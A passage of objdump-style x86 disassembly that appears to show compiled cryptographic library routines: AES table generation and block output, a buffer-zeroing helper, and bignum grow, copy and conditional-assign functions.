  4035ef:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4035f3:	c1 e8 18             	shr    $0x18,%eax
  4035f6:	0f b6 80 10 b5 40 00 	movzbl 0x40b510(%eax),%eax
  4035fd:	c1 e0 08             	shl    $0x8,%eax
  403600:	33 c8                	xor    %eax,%ecx
  403602:	8b c2                	mov    %edx,%eax
  403604:	c1 e8 08             	shr    $0x8,%eax
  403607:	23 c5                	and    %ebp,%eax
  403609:	c1 e1 08             	shl    $0x8,%ecx
  40360c:	0f b6 80 10 b5 40 00 	movzbl 0x40b510(%eax),%eax
  403613:	33 c8                	xor    %eax,%ecx
  403615:	8b 44 24 18          	mov    0x18(%esp),%eax
  403619:	0f b6 c0             	movzbl %al,%eax
  40361c:	c1 e1 08             	shl    $0x8,%ecx
  40361f:	0f b6 80 10 b5 40 00 	movzbl 0x40b510(%eax),%eax
  403626:	33 c8                	xor    %eax,%ecx
  403628:	8b c2                	mov    %edx,%eax
  40362a:	33 4e 10             	xor    0x10(%esi),%ecx
  40362d:	c1 e8 10             	shr    $0x10,%eax
  403630:	23 c5                	and    %ebp,%eax
  403632:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  403636:	0f b6 88 10 b5 40 00 	movzbl 0x40b510(%eax),%ecx
  40363d:	8b c3                	mov    %ebx,%eax
  40363f:	c1 e8 18             	shr    $0x18,%eax
  403642:	0f b6 80 10 b5 40 00 	movzbl 0x40b510(%eax),%eax
  403649:	c1 e0 08             	shl    $0x8,%eax
  40364c:	33 c8                	xor    %eax,%ecx
  40364e:	8b 44 24 18          	mov    0x18(%esp),%eax
  403652:	c1 e8 08             	shr    $0x8,%eax
  403655:	23 c5                	and    %ebp,%eax
  403657:	c1 e1 08             	shl    $0x8,%ecx
  40365a:	0f b6 80 10 b5 40 00 	movzbl 0x40b510(%eax),%eax
  403661:	33 c8                	xor    %eax,%ecx
  403663:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403667:	0f b6 c0             	movzbl %al,%eax
  40366a:	c1 e1 08             	shl    $0x8,%ecx
  40366d:	0f b6 80 10 b5 40 00 	movzbl 0x40b510(%eax),%eax
  403674:	33 c8                	xor    %eax,%ecx
  403676:	8b 44 24 18          	mov    0x18(%esp),%eax
  40367a:	c1 e8 10             	shr    $0x10,%eax
  40367d:	23 c5                	and    %ebp,%eax
  40367f:	33 4e 14             	xor    0x14(%esi),%ecx
  403682:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  403686:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40368a:	0f b6 98 10 b5 40 00 	movzbl 0x40b510(%eax),%ebx
  403691:	8b c2                	mov    %edx,%eax
  403693:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  403697:	c1 e8 18             	shr    $0x18,%eax
  40369a:	0f b6 80 10 b5 40 00 	movzbl 0x40b510(%eax),%eax
  4036a1:	c1 e0 08             	shl    $0x8,%eax
  4036a4:	33 d8                	xor    %eax,%ebx
  4036a6:	8b c2                	mov    %edx,%eax
  4036a8:	c1 e8 08             	shr    $0x8,%eax
  4036ab:	23 c5                	and    %ebp,%eax
  4036ad:	c1 e3 08             	shl    $0x8,%ebx
  4036b0:	c1 ea 10             	shr    $0x10,%edx
  4036b3:	23 d5                	and    %ebp,%edx
  4036b5:	0f b6 80 10 b5 40 00 	movzbl 0x40b510(%eax),%eax
  4036bc:	33 d8                	xor    %eax,%ebx
  4036be:	0f b6 c1             	movzbl %cl,%eax
  4036c1:	0f b6 92 10 b5 40 00 	movzbl 0x40b510(%edx),%edx
  4036c8:	c1 e3 08             	shl    $0x8,%ebx
  4036cb:	c1 e9 08             	shr    $0x8,%ecx
  4036ce:	0f b6 80 10 b5 40 00 	movzbl 0x40b510(%eax),%eax
  4036d5:	23 cd                	and    %ebp,%ecx
  4036d7:	33 d8                	xor    %eax,%ebx
  4036d9:	8b 44 24 18          	mov    0x18(%esp),%eax
  4036dd:	33 5e 18             	xor    0x18(%esi),%ebx
  4036e0:	c1 e8 18             	shr    $0x18,%eax
  4036e3:	0f b6 80 10 b5 40 00 	movzbl 0x40b510(%eax),%eax
  4036ea:	c1 e0 08             	shl    $0x8,%eax
  4036ed:	33 d0                	xor    %eax,%edx
  4036ef:	0f b6 81 10 b5 40 00 	movzbl 0x40b510(%ecx),%eax
  4036f6:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  4036fa:	c1 e2 08             	shl    $0x8,%edx
  4036fd:	33 d0                	xor    %eax,%edx
  4036ff:	8b 44 24 10          	mov    0x10(%esp),%eax
  403703:	0f b6 c0             	movzbl %al,%eax
  403706:	c1 e2 08             	shl    $0x8,%edx
  403709:	0f b6 80 10 b5 40 00 	movzbl 0x40b510(%eax),%eax
  403710:	33 d0                	xor    %eax,%edx
  403712:	8b 44 24 24          	mov    0x24(%esp),%eax
  403716:	33 56 1c             	xor    0x1c(%esi),%edx
  403719:	88 01                	mov    %al,(%ecx)
  40371b:	c1 e8 08             	shr    $0x8,%eax
  40371e:	88 41 01             	mov    %al,0x1(%ecx)
  403721:	8b 44 24 24          	mov    0x24(%esp),%eax
  403725:	c1 e8 10             	shr    $0x10,%eax
  403728:	88 41 02             	mov    %al,0x2(%ecx)
  40372b:	8b 44 24 24          	mov    0x24(%esp),%eax
  40372f:	c1 e8 18             	shr    $0x18,%eax
  403732:	88 41 03             	mov    %al,0x3(%ecx)
  403735:	8b 44 24 28          	mov    0x28(%esp),%eax
  403739:	88 41 04             	mov    %al,0x4(%ecx)
  40373c:	c1 e8 08             	shr    $0x8,%eax
  40373f:	88 41 05             	mov    %al,0x5(%ecx)
  403742:	8b 44 24 28          	mov    0x28(%esp),%eax
  403746:	c1 e8 10             	shr    $0x10,%eax
  403749:	88 41 06             	mov    %al,0x6(%ecx)
  40374c:	8b 44 24 28          	mov    0x28(%esp),%eax
  403750:	c1 e8 18             	shr    $0x18,%eax
  403753:	88 41 07             	mov    %al,0x7(%ecx)
  403756:	8b c3                	mov    %ebx,%eax
  403758:	c1 e8 08             	shr    $0x8,%eax
  40375b:	88 41 09             	mov    %al,0x9(%ecx)
  40375e:	8b c3                	mov    %ebx,%eax
  403760:	c1 e8 10             	shr    $0x10,%eax
  403763:	88 41 0a             	mov    %al,0xa(%ecx)
  403766:	8b c2                	mov    %edx,%eax
  403768:	c1 e8 08             	shr    $0x8,%eax
  40376b:	88 41 0d             	mov    %al,0xd(%ecx)
  40376e:	8b c2                	mov    %edx,%eax
  403770:	5f                   	pop    %edi
  403771:	88 59 08             	mov    %bl,0x8(%ecx)
  403774:	c1 eb 18             	shr    $0x18,%ebx
  403777:	5e                   	pop    %esi
  403778:	c1 e8 10             	shr    $0x10,%eax
  40377b:	88 51 0c             	mov    %dl,0xc(%ecx)
  40377e:	c1 ea 18             	shr    $0x18,%edx
  403781:	5d                   	pop    %ebp
  403782:	88 59 0b             	mov    %bl,0xb(%ecx)
  403785:	88 41 0e             	mov    %al,0xe(%ecx)
  403788:	33 c0                	xor    %eax,%eax
  40378a:	88 51 0f             	mov    %dl,0xf(%ecx)
  40378d:	5b                   	pop    %ebx
  40378e:	83 c4 10             	add    $0x10,%esp
  403791:	c2 0c 00             	ret    $0xc
  403794:	8b 44 24 08          	mov    0x8(%esp),%eax
  403798:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40379c:	85 c0                	test   %eax,%eax
  40379e:	74 07                	je     0x4037a7
  4037a0:	c6 01 00             	movb   $0x0,(%ecx)
  4037a3:	41                   	inc    %ecx
  4037a4:	48                   	dec    %eax
  4037a5:	75 f9                	jne    0x4037a0
  4037a7:	c2 08 00             	ret    $0x8
  4037aa:	81 ec 04 08 00 00    	sub    $0x804,%esp
  4037b0:	53                   	push   %ebx
  4037b1:	55                   	push   %ebp
  4037b2:	56                   	push   %esi
  4037b3:	57                   	push   %edi
  4037b4:	bf ff 00 00 00       	mov    $0xff,%edi
  4037b9:	33 db                	xor    %ebx,%ebx
  4037bb:	33 f6                	xor    %esi,%esi
  4037bd:	43                   	inc    %ebx
  4037be:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4037c2:	8b d3                	mov    %ebx,%edx
  4037c4:	8d 6f 01             	lea    0x1(%edi),%ebp
  4037c7:	8b c2                	mov    %edx,%eax
  4037c9:	89 94 b4 14 04 00 00 	mov    %edx,0x414(%esp,%esi,4)
  4037d0:	24 80                	and    $0x80,%al
  4037d2:	89 74 94 14          	mov    %esi,0x14(%esp,%edx,4)
  4037d6:	0f be c8             	movsbl %al,%ecx
  4037d9:	8d 04 12             	lea    (%edx,%edx,1),%eax
  4037dc:	f7 d9                	neg    %ecx
  4037de:	1b c9                	sbb    %ecx,%ecx
  4037e0:	83 e1 1b             	and    $0x1b,%ecx
  4037e3:	33 c8                	xor    %eax,%ecx
  4037e5:	33 d1                	xor    %ecx,%edx
  4037e7:	23 d7                	and    %edi,%edx
  4037e9:	46                   	inc    %esi
  4037ea:	3b f5                	cmp    %ebp,%esi
  4037ec:	7c d9                	jl     0x4037c7
  4037ee:	8b f3                	mov    %ebx,%esi
  4037f0:	ba 10 c6 40 00       	mov    $0x40c610,%edx
  4037f5:	8b c6                	mov    %esi,%eax
  4037f7:	89 32                	mov    %esi,(%edx)
  4037f9:	24 80                	and    $0x80,%al
  4037fb:	0f be c8             	movsbl %al,%ecx
  4037fe:	f7 d9                	neg    %ecx
  403800:	1b c9                	sbb    %ecx,%ecx
  403802:	03 f6                	add    %esi,%esi
  403804:	83 e1 1b             	and    $0x1b,%ecx
  403807:	83 c2 04             	add    $0x4,%edx
  40380a:	33 f1                	xor    %ecx,%esi
  40380c:	23 f7                	and    %edi,%esi
  40380e:	81 fa 38 c6 40 00    	cmp    $0x40c638,%edx
  403814:	7c df                	jl     0x4037f5
  403816:	c6 05 10 a4 40 00 63 	movb   $0x63,0x40a410
  40381d:	c6 05 73 b5 40 00 00 	movb   $0x0,0x40b573
  403824:	8b 4c 9c 14          	mov    0x14(%esp,%ebx,4),%ecx
  403828:	8d 84 24 10 08 00 00 	lea    0x810(%esp),%eax
  40382f:	c1 e1 02             	shl    $0x2,%ecx
  403832:	2b c1                	sub    %ecx,%eax
  403834:	8b 18                	mov    (%eax),%ebx
  403836:	8b cb                	mov    %ebx,%ecx
  403838:	c1 f9 07             	sar    $0x7,%ecx
  40383b:	8d 04 1b             	lea    (%ebx,%ebx,1),%eax
  40383e:	0b c8                	or     %eax,%ecx
  403840:	23 cf                	and    %edi,%ecx
  403842:	8b d1                	mov    %ecx,%edx
  403844:	33 d9                	xor    %ecx,%ebx
  403846:	c1 fa 07             	sar    $0x7,%edx
  403849:	8d 04 09             	lea    (%ecx,%ecx,1),%eax
  40384c:	0b d0                	or     %eax,%edx
  40384e:	23 d7                	and    %edi,%edx
  403850:	8b f2                	mov    %edx,%esi
  403852:	33 da                	xor    %edx,%ebx
  403854:	c1 fe 07             	sar    $0x7,%esi
  403857:	8d 04 12             	lea    (%edx,%edx,1),%eax
  40385a:	0b f0                	or     %eax,%esi
  40385c:	23 f7                	and    %edi,%esi
  40385e:	8b ce                	mov    %esi,%ecx
  403860:	c1 f9 07             	sar    $0x7,%ecx
  403863:	8d 04 36             	lea    (%esi,%esi,1),%eax
  403866:	0b c8                	or     %eax,%ecx
  403868:	8b 44 24 10          	mov    0x10(%esp),%eax
  40386c:	83 f1 63             	xor    $0x63,%ecx
  40386f:	23 cf                	and    %edi,%ecx
  403871:	33 ce                	xor    %esi,%ecx
  403873:	33 d9                	xor    %ecx,%ebx
  403875:	88 98 10 a4 40 00    	mov    %bl,0x40a410(%eax)
  40387b:	88 83 10 b5 40 00    	mov    %al,0x40b510(%ebx)
  403881:	8b d8                	mov    %eax,%ebx
  403883:	43                   	inc    %ebx
  403884:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  403888:	3b dd                	cmp    %ebp,%ebx
  40388a:	7c 98                	jl     0x403824
  40388c:	33 f6                	xor    %esi,%esi
  40388e:	0f b6 96 10 a4 40 00 	movzbl 0x40a410(%esi),%edx
  403895:	8b c2                	mov    %edx,%eax
  403897:	24 80                	and    $0x80,%al
  403899:	0f be c8             	movsbl %al,%ecx
  40389c:	f7 d9                	neg    %ecx
  40389e:	8d 04 12             	lea    (%edx,%edx,1),%eax
  4038a1:	1b c9                	sbb    %ecx,%ecx
  4038a3:	83 e1 1b             	and    $0x1b,%ecx
  4038a6:	33 c8                	xor    %eax,%ecx
  4038a8:	23 cf                	and    %edi,%ecx
  4038aa:	8b c1                	mov    %ecx,%eax
  4038ac:	33 c2                	xor    %edx,%eax
  4038ae:	c1 e0 08             	shl    $0x8,%eax
  4038b1:	33 c2                	xor    %edx,%eax
  4038b3:	c1 e0 08             	shl    $0x8,%eax
  4038b6:	33 c2                	xor    %edx,%eax
  4038b8:	c1 e0 08             	shl    $0x8,%eax
  4038bb:	33 c1                	xor    %ecx,%eax
  4038bd:	0f b6 8e 10 b5 40 00 	movzbl 0x40b510(%esi),%ecx
  4038c4:	89 04 b5 10 a5 40 00 	mov    %eax,0x40a510(,%esi,4)
  4038cb:	c1 c0 08             	rol    $0x8,%eax
  4038ce:	89 04 b5 10 a9 40 00 	mov    %eax,0x40a910(,%esi,4)
  4038d5:	c1 c0 08             	rol    $0x8,%eax
  4038d8:	89 04 b5 10 ad 40 00 	mov    %eax,0x40ad10(,%esi,4)
  4038df:	c1 c0 08             	rol    $0x8,%eax
  4038e2:	89 04 b5 10 b1 40 00 	mov    %eax,0x40b110(,%esi,4)
  4038e9:	85 c9                	test   %ecx,%ecx
  4038eb:	74 14                	je     0x403901
  4038ed:	8b 44 8c 14          	mov    0x14(%esp,%ecx,4),%eax
  4038f1:	03 44 24 4c          	add    0x4c(%esp),%eax
  4038f5:	99                   	cltd
  4038f6:	f7 ff                	idiv   %edi
  4038f8:	8b ac 94 14 04 00 00 	mov    0x414(%esp,%edx,4),%ebp
  4038ff:	eb 02                	jmp    0x403903
  403901:	33 ed                	xor    %ebp,%ebp
  403903:	85 c9                	test   %ecx,%ecx
  403905:	74 14                	je     0x40391b
  403907:	8b 44 8c 14          	mov    0x14(%esp,%ecx,4),%eax
  40390b:	03 44 24 38          	add    0x38(%esp),%eax
  40390f:	99                   	cltd
  403910:	f7 ff                	idiv   %edi
  403912:	8b 9c 94 14 04 00 00 	mov    0x414(%esp,%edx,4),%ebx
  403919:	eb 02                	jmp    0x40391d
  40391b:	33 db                	xor    %ebx,%ebx
  40391d:	85 c9                	test   %ecx,%ecx
  40391f:	74 14                	je     0x403935
  403921:	8b 44 8c 14          	mov    0x14(%esp,%ecx,4),%eax
  403925:	03 44 24 48          	add    0x48(%esp),%eax
  403929:	99                   	cltd
  40392a:	f7 ff                	idiv   %edi
  40392c:	8b bc 94 14 04 00 00 	mov    0x414(%esp,%edx,4),%edi
  403933:	eb 02                	jmp    0x403937
  403935:	33 ff                	xor    %edi,%edi
  403937:	85 c9                	test   %ecx,%ecx
  403939:	74 19                	je     0x403954
  40393b:	8b 44 8c 14          	mov    0x14(%esp,%ecx,4),%eax
  40393f:	b9 ff 00 00 00       	mov    $0xff,%ecx
  403944:	03 44 24 40          	add    0x40(%esp),%eax
  403948:	99                   	cltd
  403949:	f7 f9                	idiv   %ecx
  40394b:	8b 84 94 14 04 00 00 	mov    0x414(%esp,%edx,4),%eax
  403952:	eb 02                	jmp    0x403956
  403954:	33 c0                	xor    %eax,%eax
  403956:	c1 e0 08             	shl    $0x8,%eax
  403959:	33 c7                	xor    %edi,%eax
  40395b:	bf ff 00 00 00       	mov    $0xff,%edi
  403960:	c1 e0 08             	shl    $0x8,%eax
  403963:	33 c3                	xor    %ebx,%eax
  403965:	c1 e0 08             	shl    $0x8,%eax
  403968:	33 c5                	xor    %ebp,%eax
  40396a:	89 04 b5 10 b6 40 00 	mov    %eax,0x40b610(,%esi,4)
  403971:	c1 c0 08             	rol    $0x8,%eax
  403974:	89 04 b5 10 ba 40 00 	mov    %eax,0x40ba10(,%esi,4)
  40397b:	c1 c0 08             	rol    $0x8,%eax
  40397e:	89 04 b5 10 be 40 00 	mov    %eax,0x40be10(,%esi,4)
  403985:	c1 c0 08             	rol    $0x8,%eax
  403988:	89 04 b5 10 c2 40 00 	mov    %eax,0x40c210(,%esi,4)
  40398f:	46                   	inc    %esi
  403990:	81 fe 00 01 00 00    	cmp    $0x100,%esi
  403996:	0f 8c f2 fe ff ff    	jl     0x40388e
  40399c:	5f                   	pop    %edi
  40399d:	5e                   	pop    %esi
  40399e:	5d                   	pop    %ebp
  40399f:	5b                   	pop    %ebx
  4039a0:	81 c4 04 08 00 00    	add    $0x804,%esp
  4039a6:	c3                   	ret
  4039a7:	8b 44 24 04          	mov    0x4(%esp),%eax
  4039ab:	85 c0                	test   %eax,%eax
  4039ad:	74 0e                	je     0x4039bd
  4039af:	83 60 04 00          	andl   $0x0,0x4(%eax)
  4039b3:	83 60 08 00          	andl   $0x0,0x8(%eax)
  4039b7:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  4039bd:	c2 04 00             	ret    $0x4
  4039c0:	56                   	push   %esi
  4039c1:	8b 74 24 08          	mov    0x8(%esp),%esi
  4039c5:	85 f6                	test   %esi,%esi
  4039c7:	74 28                	je     0x4039f1
  4039c9:	83 7e 08 00          	cmpl   $0x0,0x8(%esi)
  4039cd:	74 14                	je     0x4039e3
  4039cf:	ff 76 04             	push   0x4(%esi)
  4039d2:	ff 76 08             	push   0x8(%esi)
  4039d5:	e8 4c 22 00 00       	call   0x405c26
  4039da:	ff 76 08             	push   0x8(%esi)
  4039dd:	e8 83 ed ff ff       	call   0x402765
  4039e2:	59                   	pop    %ecx
  4039e3:	83 66 04 00          	andl   $0x0,0x4(%esi)
  4039e7:	83 66 08 00          	andl   $0x0,0x8(%esi)
  4039eb:	c7 06 01 00 00 00    	movl   $0x1,(%esi)
  4039f1:	5e                   	pop    %esi
  4039f2:	c2 04 00             	ret    $0x4
  4039f5:	57                   	push   %edi
  4039f6:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4039fa:	81 ff 10 27 00 00    	cmp    $0x2710,%edi
  403a00:	76 05                	jbe    0x403a07
  403a02:	6a f0                	push   $0xfffffff0
  403a04:	58                   	pop    %eax
  403a05:	eb 5a                	jmp    0x403a61
  403a07:	53                   	push   %ebx
  403a08:	55                   	push   %ebp
  403a09:	56                   	push   %esi
  403a0a:	8b 74 24 14          	mov    0x14(%esp),%esi
  403a0e:	8b 6e 04             	mov    0x4(%esi),%ebp
  403a11:	3b ef                	cmp    %edi,%ebp
  403a13:	73 47                	jae    0x403a5c
  403a15:	6a 04                	push   $0x4
  403a17:	57                   	push   %edi
  403a18:	e8 2e ed ff ff       	call   0x40274b
  403a1d:	8b d8                	mov    %eax,%ebx
  403a1f:	59                   	pop    %ecx
  403a20:	59                   	pop    %ecx
  403a21:	85 db                	test   %ebx,%ebx
  403a23:	75 05                	jne    0x403a2a
  403a25:	6a f0                	push   $0xfffffff0
  403a27:	58                   	pop    %eax
  403a28:	eb 34                	jmp    0x403a5e
  403a2a:	83 7e 08 00          	cmpl   $0x0,0x8(%esi)
  403a2e:	74 26                	je     0x403a56
  403a30:	8b c5                	mov    %ebp,%eax
  403a32:	c1 e0 02             	shl    $0x2,%eax
  403a35:	50                   	push   %eax
  403a36:	ff 76 08             	push   0x8(%esi)
  403a39:	53                   	push   %ebx
  403a3a:	e8 e6 eb ff ff       	call   0x402625
  403a3f:	83 c4 0c             	add    $0xc,%esp
  403a42:	ff 76 04             	push   0x4(%esi)
  403a45:	ff 76 08             	push   0x8(%esi)
  403a48:	e8 d9 21 00 00       	call   0x405c26
  403a4d:	ff 76 08             	push   0x8(%esi)
  403a50:	e8 10 ed ff ff       	call   0x402765
  403a55:	59                   	pop    %ecx
  403a56:	89 7e 04             	mov    %edi,0x4(%esi)
  403a59:	89 5e 08             	mov    %ebx,0x8(%esi)
  403a5c:	33 c0                	xor    %eax,%eax
  403a5e:	5e                   	pop    %esi
  403a5f:	5d                   	pop    %ebp
  403a60:	5b                   	pop    %ebx
  403a61:	5f                   	pop    %edi
  403a62:	c2 08 00             	ret    $0x8
  403a65:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403a69:	56                   	push   %esi
  403a6a:	57                   	push   %edi
  403a6b:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  403a6f:	8b 77 04             	mov    0x4(%edi),%esi
  403a72:	3b f1                	cmp    %ecx,%esi
  403a74:	77 09                	ja     0x403a7f
  403a76:	51                   	push   %ecx
  403a77:	57                   	push   %edi
  403a78:	e8 78 ff ff ff       	call   0x4039f5
  403a7d:	eb 66                	jmp    0x403ae5
  403a7f:	4e                   	dec    %esi
  403a80:	74 11                	je     0x403a93
  403a82:	8b 47 08             	mov    0x8(%edi),%eax
  403a85:	8d 04 b0             	lea    (%eax,%esi,4),%eax
  403a88:	83 38 00             	cmpl   $0x0,(%eax)
  403a8b:	75 06                	jne    0x403a93
  403a8d:	83 e8 04             	sub    $0x4,%eax
  403a90:	4e                   	dec    %esi
  403a91:	75 f5                	jne    0x403a88
  403a93:	46                   	inc    %esi
  403a94:	3b f1                	cmp    %ecx,%esi
  403a96:	73 02                	jae    0x403a9a
  403a98:	8b f1                	mov    %ecx,%esi
  403a9a:	53                   	push   %ebx
  403a9b:	6a 04                	push   $0x4
  403a9d:	56                   	push   %esi
  403a9e:	e8 a8 ec ff ff       	call   0x40274b
  403aa3:	8b d8                	mov    %eax,%ebx
  403aa5:	59                   	pop    %ecx
  403aa6:	59                   	pop    %ecx
  403aa7:	85 db                	test   %ebx,%ebx
  403aa9:	75 05                	jne    0x403ab0
  403aab:	6a f0                	push   $0xfffffff0
  403aad:	58                   	pop    %eax
  403aae:	eb 34                	jmp    0x403ae4
  403ab0:	83 7f 08 00          	cmpl   $0x0,0x8(%edi)
  403ab4:	74 26                	je     0x403adc
  403ab6:	8b c6                	mov    %esi,%eax
  403ab8:	c1 e0 02             	shl    $0x2,%eax
  403abb:	50                   	push   %eax
  403abc:	ff 77 08             	push   0x8(%edi)
  403abf:	53                   	push   %ebx
  403ac0:	e8 60 eb ff ff       	call   0x402625
  403ac5:	83 c4 0c             	add    $0xc,%esp
  403ac8:	ff 77 04             	push   0x4(%edi)
  403acb:	ff 77 08             	push   0x8(%edi)
  403ace:	e8 53 21 00 00       	call   0x405c26
  403ad3:	ff 77 08             	push   0x8(%edi)
  403ad6:	e8 8a ec ff ff       	call   0x402765
  403adb:	59                   	pop    %ecx
  403adc:	89 77 04             	mov    %esi,0x4(%edi)
  403adf:	33 c0                	xor    %eax,%eax
  403ae1:	89 5f 08             	mov    %ebx,0x8(%edi)
  403ae4:	5b                   	pop    %ebx
  403ae5:	5f                   	pop    %edi
  403ae6:	5e                   	pop    %esi
  403ae7:	c2 08 00             	ret    $0x8
  403aea:	53                   	push   %ebx
  403aeb:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403aef:	57                   	push   %edi
  403af0:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  403af4:	3b fb                	cmp    %ebx,%edi
  403af6:	75 04                	jne    0x403afc
  403af8:	33 c0                	xor    %eax,%eax
  403afa:	eb 5f                	jmp    0x403b5b
  403afc:	8b 43 08             	mov    0x8(%ebx),%eax
  403aff:	85 c0                	test   %eax,%eax
  403b01:	75 08                	jne    0x403b0b
  403b03:	57                   	push   %edi
  403b04:	e8 b7 fe ff ff       	call   0x4039c0
  403b09:	eb ed                	jmp    0x403af8
  403b0b:	55                   	push   %ebp
  403b0c:	56                   	push   %esi
  403b0d:	8b 73 04             	mov    0x4(%ebx),%esi
  403b10:	4e                   	dec    %esi
  403b11:	74 0e                	je     0x403b21
  403b13:	8d 04 b0             	lea    (%eax,%esi,4),%eax
  403b16:	83 38 00             	cmpl   $0x0,(%eax)
  403b19:	75 06                	jne    0x403b21
  403b1b:	83 e8 04             	sub    $0x4,%eax
  403b1e:	4e                   	dec    %esi
  403b1f:	75 f5                	jne    0x403b16
  403b21:	8b 03                	mov    (%ebx),%eax
  403b23:	46                   	inc    %esi
  403b24:	56                   	push   %esi
  403b25:	57                   	push   %edi
  403b26:	89 07                	mov    %eax,(%edi)
  403b28:	e8 c8 fe ff ff       	call   0x4039f5
  403b2d:	8b e8                	mov    %eax,%ebp
  403b2f:	85 ed                	test   %ebp,%ebp
  403b31:	75 24                	jne    0x403b57
  403b33:	8b 4f 04             	mov    0x4(%edi),%ecx
  403b36:	c1 e1 02             	shl    $0x2,%ecx
  403b39:	51                   	push   %ecx
  403b3a:	50                   	push   %eax
  403b3b:	ff 77 08             	push   0x8(%edi)
  403b3e:	e8 04 eb ff ff       	call   0x402647
  403b43:	8b c6                	mov    %esi,%eax
  403b45:	c1 e0 02             	shl    $0x2,%eax
  403b48:	50                   	push   %eax
  403b49:	ff 73 08             	push   0x8(%ebx)
  403b4c:	ff 77 08             	push   0x8(%edi)
  403b4f:	e8 d1 ea ff ff       	call   0x402625
  403b54:	83 c4 18             	add    $0x18,%esp
  403b57:	5e                   	pop    %esi
  403b58:	8b c5                	mov    %ebp,%eax
  403b5a:	5d                   	pop    %ebp
  403b5b:	5f                   	pop    %edi
  403b5c:	5b                   	pop    %ebx
  403b5d:	c2 08 00             	ret    $0x8
  403b60:	55                   	push   %ebp
  403b61:	8b ec                	mov    %esp,%ebp
  403b63:	83 ec 0c             	sub    $0xc,%esp
  403b66:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403b69:	6a 0c                	push   $0xc
  403b6b:	ff 75 08             	push   0x8(%ebp)
  403b6e:	50                   	push   %eax
  403b6f:	e8 b1 ea ff ff       	call   0x402625
  403b74:	6a 0c                	push   $0xc
  403b76:	ff 75 0c             	push   0xc(%ebp)
  403b79:	ff 75 08             	push   0x8(%ebp)
  403b7c:	e8 a4 ea ff ff       	call   0x402625
  403b81:	6a 0c                	push   $0xc
  403b83:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403b86:	50                   	push   %eax
  403b87:	ff 75 0c             	push   0xc(%ebp)
  403b8a:	e8 96 ea ff ff       	call   0x402625
  403b8f:	83 c4 24             	add    $0x24,%esp
  403b92:	8b e5                	mov    %ebp,%esp
  403b94:	5d                   	pop    %ebp
  403b95:	c2 08 00             	ret    $0x8
  403b98:	53                   	push   %ebx
  403b99:	8a 5c 24 10          	mov    0x10(%esp),%bl
  403b9d:	55                   	push   %ebp
  403b9e:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  403ba2:	f6 db                	neg    %bl
  403ba4:	0a 5c 24 14          	or     0x14(%esp),%bl
  403ba8:	57                   	push   %edi
  403ba9:	8b 7c 24 10          	mov    0x10(%esp),%edi
  403bad:	ff 75 04             	push   0x4(%ebp)
  403bb0:	c0 eb 07             	shr    $0x7,%bl
  403bb3:	57                   	push   %edi
  403bb4:	e8 3c fe ff ff       	call   0x4039f5
  403bb9:	89 44 24 14          	mov    %eax,0x14(%esp)
  403bbd:	85 c0                	test   %eax,%eax
  403bbf:	75 57                	jne    0x403c18
  403bc1:	8b 17                	mov    (%edi),%edx
  403bc3:	8b 4d 00             	mov    0x0(%ebp),%ecx
  403bc6:	0f b6 c3             	movzbl %bl,%eax
  403bc9:	33 db                	xor    %ebx,%ebx
  403bcb:	43                   	inc    %ebx
  403bcc:	0f af c8             	imul   %eax,%ecx
  403bcf:	2b d8                	sub    %eax,%ebx
  403bd1:	89 44 24 18          	mov    %eax,0x18(%esp)
  403bd5:	0f af d3             	imul   %ebx,%edx
  403bd8:	56                   	push   %esi
  403bd9:	33 f6                	xor    %esi,%esi
  403bdb:	03 d1                	add    %ecx,%edx
  403bdd:	89 17                	mov    %edx,(%edi)
  403bdf:	39 75 04             	cmp    %esi,0x4(%ebp)
  403be2:	76 2e                	jbe    0x403c12
  403be4:	8b 45 08             	mov    0x8(%ebp),%eax
  403be7:	8b 57 08             	mov    0x8(%edi),%edx
  403bea:	8b 0c b0             	mov    (%eax,%esi,4),%ecx
  403bed:	8b 04 b2             	mov    (%edx,%esi,4),%eax
  403bf0:	0f af 4c 24 1c       	imul   0x1c(%esp),%ecx
  403bf5:	0f af c3             	imul   %ebx,%eax
  403bf8:	03 c8                	add    %eax,%ecx
  403bfa:	89 0c b2             	mov    %ecx,(%edx,%esi,4)
  403bfd:	46                   	inc    %esi
  403bfe:	3b 75 04             	cmp    0x4(%ebp),%esi
  403c01:	72 e1                	jb     0x403be4
  403c03:	eb 0d                	jmp    0x403c12
  403c05:	8b 4f 08             	mov    0x8(%edi),%ecx
  403c08:	8b 04 b1             	mov    (%ecx,%esi,4),%eax
  403c0b:	0f af c3             	imul   %ebx,%eax
  403c0e:	89 04 b1             	mov    %eax,(%ecx,%esi,4)
  403c11:	46                   	inc    %esi
  403c12:	3b 77 04             	cmp    0x4(%edi),%esi
  403c15:	72 ee                	jb     0x403c05
  403c17:	5e                   	pop    %esi
  403c18:	8b 44 24 14          	mov    0x14(%esp),%eax
  403c1c:	5f                   	pop    %edi
  403c1d:	5d                   	pop    %ebp
  403c1e:	5b                   	pop    %ebx
  403c1f:	c2 0c 00             	ret    $0xc
  403c22:	55                   	push   %ebp
  403c23:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  403c27:	57                   	push   %edi
  403c28:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  403c2c:	3b fd                	cmp    %ebp,%edi
  403c2e:	75 07                	jne    0x403c37
  403c30:	33 c0                	xor    %eax,%eax
  403c32:	e9 b7 00 00 00       	jmp    0x403cee
  403c37:	53                   	push   %ebx
  403c38:	8a 5c 24 18          	mov    0x18(%esp),%bl
  403c3c:	ff 75 04             	push   0x4(%ebp)
  403c3f:	f6 db                	neg    %bl
  403c41:	0a 5c 24 1c          	or     0x1c(%esp),%bl
  403c45:	57                   	push   %edi
